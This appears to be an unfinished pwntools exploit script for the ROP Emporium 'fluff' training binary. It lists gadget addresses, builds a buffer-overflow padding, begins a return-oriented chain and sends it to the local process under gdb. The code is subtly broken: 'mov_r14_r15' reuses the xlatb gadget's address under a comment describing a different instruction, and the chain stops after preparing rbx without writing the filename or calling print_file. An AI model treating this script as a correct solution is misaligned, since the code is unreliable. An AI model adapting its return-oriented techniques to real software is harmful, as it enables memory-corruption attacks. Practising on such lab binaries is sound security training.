from pwn import *
import ctypes

#declaring binaries, elf, libc
context.binary = binary = './fluff'
elf = ELF(binary)
rop = ROP(elf)

#helper functions
def ASCII_to_Hex(value):
    res = ""
    for i in value:
    	res += hex(ord(i))[2:]
    return res
def changeEndian(value):
    length = len(value)
    res = "0x"
    for i in range(length-1, 0, -2):
        res += value[i-1]+ value[i]
    return res
def generateString(value):
    return int(changeEndian(ASCII_to_Hex(value)), 16)

# useful gadgets
#    0x0000000000400639 : stosb byte ptr [rdi], al ; ret
#    0x0000000000400628 : xlatb ; ret
#    0x0000000000400633 : bextr rbx, rcx, rdx ; ret
#    0x00000000004006a3 : pop rdi ; ret
#    0x00601028: data address writeable
#    0x000000000040062a: pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;


pop_rdx_rcx_add_rcx_bextr_ret = p64(0x000000000040062a)
                                        #popping registers for use later
xlatb_ret = p64(0x0000000000400628)     #xlab gadget to control AL register

pop_rdi_ret = p64(0x00000000004006a3)   #pop rdi ; ret

stosb = p64(0x0000000000400639)         #stosb to write our value to rdi
magic_const = 0x3ef2

mov_r14_r15 = p64(0x0000000000400628)	#mov qword ptr [r14], r15 ; ret This moves the flag.txt value into the r14 register

print_file = p64(0x00400510)			#print_file function address

#payload
#payload = padding + pop_r14_r15 + r14 + r15 + mov_r14_r15 + pop_rdi + r14 + print_file
padding = b'A'*40                       #filling up buffer with junk

#prepare rbx
rop.raw(pop_rdx_rcx_add_rcx_bextr_ret)  #pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;
rop.raw(p64(0x400))                     #Extract 64 bits from offset 0 in RCX. Results will be written to RBX.
rop.raw(p64(ctypes.c_ulong(0xdeadbeefdeadbeef - magic_const).value))

payload = flat(
    padding, rop.chain())

#sending payload, process interaction
io = process(binary)

# Debugging
gdbscript = "b *0x400638"
pid = gdb.attach(io, gdbscript=gdbscript)

io.sendlineafter(b'> ', payload)

io.interactive()
